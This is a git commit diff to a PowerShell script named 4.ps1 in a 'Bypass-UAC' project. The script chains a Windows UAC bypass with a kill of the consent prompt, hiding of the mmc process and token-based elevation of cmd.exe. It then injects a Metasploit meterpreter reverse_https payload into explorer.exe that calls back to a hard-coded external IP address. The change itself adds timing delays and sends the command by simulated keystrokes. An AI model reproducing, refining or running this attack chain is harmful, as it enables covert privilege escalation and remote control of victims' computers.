12f52bfffb43dbbdac0789ad43b8d0a3fcb25c8e
Az <z0rk@protonmail.com>
2017-12-01 15:21:15 +0100

    Update 4.ps1

--- Bypass-UAC/4.ps1
+++ Bypass-UAC/4.ps1
@@ -7,10 +7,12 @@ workflow Test
 {
     Parallel
     {
-        ${ Bypass-UAC -Method UacMethodNetOle32 };
-        ${ kill-window consent };
-        ${ hide-process mmc };
-        ${ UAC-TokenMagic -BinPath C:\Windows\System32\cmd.exe -ProcPID (ps -Name mmc).id };
-        ${ Invoke-Shellcode -ProcessId $((ps -Name explorer.exe).id) -Payload windows/meterpreter/reverse_https -Lhost  45.76.178.205 -Lport 443 };
+        Bypass-UAC -Method UacMethodNetOle32;
+        
+        sleep 3; kill-window consent;
+        sleep 2; hide-process mmc;
+        sleep 1; UAC-TokenMagic -BinPath C:\Windows\System32\cmd.exe -ProcPID (ps -Name mmc).id;
+        sleep 2; $cmd="Invoke-Shellcode -ProcessId $((ps -Name explorer.exe).id) -Payload windows/meterpreter/reverse_https -Lhost  45.76.178.205 -Lport 443;"
+        sleep 4; send-keys -Name $cmd -Cmd $cmd
     }
 }
